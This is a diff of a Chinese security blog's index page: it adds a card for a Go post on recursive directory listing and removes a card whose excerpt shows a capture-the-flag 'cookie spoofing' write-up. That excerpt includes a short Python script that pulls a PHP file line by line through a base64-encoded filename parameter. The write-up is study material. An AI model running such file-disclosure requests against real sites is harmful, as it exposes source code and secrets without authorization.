@@ -145,6 +145,81 @@
     
     
     <div class="col-12 col-md-8 mx-auto index-info">
+      <a href="/目录遍历到递归.html">
+        <p class="h4 index-header">目录遍历到递归</p>
+      </a>
+
+      <a href="/目录遍历到递归.html">
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">前言
+半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理…
+
+
+一步一jo印
+
+中序
+之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。
+
+
+思路
+
+
+指定需要遍历的目录
+列出目录下的所有文件以及文件夹
+打印文件名或文件夹名
+判断是否为文件夹，是则去第1步，否则去第5步
+退出
+
+后续
+用递归的方式实现该程序
+
+package main
+
+import (
+    &quot;fmt&quot;
+    &quot;io/ioutil&quot;
+)
+
+func main() {
+    listDir(&quot;/Users/bufsnake&quot;, 0)
+}
+
+func listDir(dir string, level int) {
+    s := &quot;&quot;
+    for i := 0; i &lt; lev</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-30&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/Go">Go</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/golang">golang</a>&nbsp;
+          
+            <a href="/tags/go">go</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-8 mx-auto index-info">
       <a href="/Sudo提权漏洞复现.html">
         <p class="h4 index-header">Sudo提权漏洞复现</p>
       </a>
@@ -710,69 +785,6 @@ Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0
       <div class="index-btm">
         
           <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-22&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/web">web</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/web">web</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-8 mx-auto index-info">
-      <a href="/cookie欺骗-writeup.html">
-        <p class="h4 index-header">cookie欺骗 writeup</p>
-      </a>
-
-      <a href="/cookie欺骗-writeup.html">
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">
-Begin
-
-
-
-发现filename为keys.txt的base64加密，试着读取index.php文件
-
-
-
-发现能读到东西了，接下来读取整个文件
-
-from requests import *
-from base64 import *
-
-for i in range(0,20):
-    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&quot;%i
-    respone = get(url=url)
-    print respone.text
-
-
-&lt;?php
-
-error_reporting(0);
-$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);
-$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;
-if($file==</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-21&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
